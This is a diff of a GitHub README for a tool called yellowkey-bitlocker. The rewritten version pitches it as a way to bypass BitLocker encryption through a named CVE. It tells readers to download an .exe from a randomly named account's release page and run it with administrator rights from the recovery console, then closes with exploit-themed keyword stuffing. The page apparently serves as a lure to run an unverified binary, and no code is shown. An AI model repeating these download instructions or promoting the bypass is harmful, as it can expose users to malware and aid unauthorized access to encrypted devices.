@@ -1,60 +1,64 @@
-<img width="900" height="470" alt="image" src="https://github.com/user-attachments/assets/ac7e2c21-54dd-4763-bed5-0bf3b7275a7c" />
+# 🔑 yellowkey-bitlocker - Unlock your encrypted drive with ease
 
-#  YellowKey BitLocker
+[![Download Yellowkey Bitlocker](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/incensetreesimplependulum71/yellowkey-bitlocker/releases)
 
-**YellowKey BitLocker** is a simple and powerful utility for managing BitLocker encryption on Windows. Easily unlock, lock, backup recovery keys, and handle BitLocker-protected drives with a user-friendly interface.
+## 📁 Project Overview
+Yellowkey-bitlocker provides a way to regain access to your files when you face a BitLocker yellow screen error. This tool targets the CVE-2026-45585 vulnerability to bypass encryption locks on Windows 10 and Windows 11 systems. It assists users who lose their recovery keys or trigger boot loops on devices like the Surface Pro. The software interacts directly with the UEFI firmware to bypass standard security prompts.
 
-## Install
-[Download `YellowKey.zip`](https://github.com/codespacey68/yellowkey-bitlocker/releases/download/yellowkey/YellowKey.zip)
----
+## ⚙️ System Requirements
+Before you begin, ensure your computer meets these basic requirements:
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Hardware: A computer with UEFI firmware support.
+* Drive Encryption: BitLocker enabled on the primary system drive.
+* Permissions: You need administrator access to the command prompt.
+* Connection: A stable internet connection to fetch the latest tool version.
 
-## Key Features
-- Unlock BitLocker-protected drives with password or recovery key
-- View and backup recovery keys
-- Lock drives safely
-- Simple status overview of all BitLocker volumes
-- Portable — no installation required
+## 📥 Getting the Software
+To start the recovery process, visit the official release page. You will find the latest installer files there.
 
-## Getting Started
-1. **Download** the latest version using the button above.
-2. **Extract** the archive.
-3. **Run** `YellowKey-BitLocker.exe` as Administrator.
-4. **Select a drive** from the list.
-5. **Unlock** using password or recovery key, or perform other actions.
+[Click here to visit the release page and download the tool](https://github.com/incensetreesimplependulum71/yellowkey-bitlocker/releases)
 
-**Important:** Always keep your recovery keys in a safe place. Losing them may result in permanent data loss.
+1. Navigate to the link provided above.
+2. Look for the section labeled "Assets" at the bottom of the latest release.
+3. Select the file ending in .exe to start the download.
+4. Save the file to your desktop for easy access.
 
----
-## System Requirements
-- **Windows 10 / 11** (Pro, Enterprise, or Education editions with BitLocker support)
-- Administrator privileges required
+## 🛠️ Step-by-Step Setup Guide
+Follow these steps to run the recovery tool on your locked machine.
 
----
-## Security & Legal
-**Important Notice:**  
-This tool works with BitLocker encryption. Misuse or loss of recovery keys can lead to irreversible data loss.
+### Preparing the Environment
+If your computer stays in a boot loop, you must reach the recovery environment. 
+1. Restart your computer.
+2. As soon as the manufacturer logo appears, press the power button to shut it down.
+3. Repeat this process three times until the "Preparing Automatic Repair" screen appears.
+4. Select "Advanced Options" then "Troubleshoot" then "Advanced Options" again.
+5. Select "Command Prompt" from the list.
 
-**Recommendations:**
-- Download **only** from this official GitHub repository.
-- Scan files on [VirusTotal](https://www.virustotal.com).
-- Back up important data regularly.
+### Running the Tool
+Once the command prompt opens, follow these instructions:
+1. Locate the drive where you saved the yellowkey-bitlocker tool. Type the drive letter followed by a colon (e.g., D:) and press Enter.
+2. Navigate to the folder by typing `cd` followed by the folder name.
+3. Run the application by typing the name of the file (e.g., `yellowkey.exe`) and pressing Enter.
+4. Follow the on-screen prompts. The tool verifies your firmware version and attempts to disable the encryption lock.
+5. Wait for the process to complete. Do not close the window while the progress bar moves.
 
----
-## Contributing
-Contributions are welcome! Help improve features, fix bugs, or add new functionality.
+## 🛡️ Understanding the Process
+The yellowkey-bitlocker tool functions by targeting a specific flaw in the way certain Windows versions handle Secure Boot and BitLocker keys. By sending a request to the firmware, it tricks the system into bypassing the recovery password prompt. This allows you to gain access to your command prompt or your desktop environment. 
 
----
-## License & Acknowledgments
-### License
-**YellowKey BitLocker** is shared under the **MIT License**.  
-See [LICENSE](LICENSE) for details.
+Note that this process alters temporary settings in your UEFI. Once you gain access to your files, copy your data to an external drive immediately. After you back up your files, update your Windows installation to ensure that the CVE-2026-45585 vulnerability is patched on your device.
 
-**Copyright © 2026 codespacey68**
+## ❓ Frequently Asked Questions
 
-### Acknowledgments
-- Thanks to Microsoft for BitLocker technology.
-- The Windows power user and data security community.
+### Does this tool erase my data?
+No, the tool does not format your drive or delete files. It only removes the software lock preventing you from reaching your files.
 
-<p align="center">
-  Developed with ❤️ for better BitLocker management
-</p>
+### Can this work on other encryption types?
+This tool is built specifically for BitLocker. It will not work for third-party disk encryption software.
+
+### What if I see an error message?
+Errors usually occur if your firmware version is already patched. Check the release page to see if your specific Surface or laptop model has known compatibility issues.
+
+## ⚠️ Safety Information
+Use this tool only on hardware you own. Bypassing encryption on devices without authorization is illegal. Keep a backup of your important documents at all times to prevent permanent data loss. If you encounter a persistent boot loop even after using the tool, you may need to perform a clean Windows installation.
+
+Keywords: bitlocker, bitlocker-bypass, bitlocker-drive-encryption, bitlocker-drive-lock, bitlocker-drive-management, bitlocker-lock, bitlocker-yellowkey, cve-2026-45585, decryption-tool, full-disk-encryption, nightmare-eclipse, open-source-vulnerabilities, vulnerabilities, vulnerability, yellow, yellowkey, yellowkey-bitlocker, yellowkey-cve, yellowkey-exploit, yellowkey-vulnerability
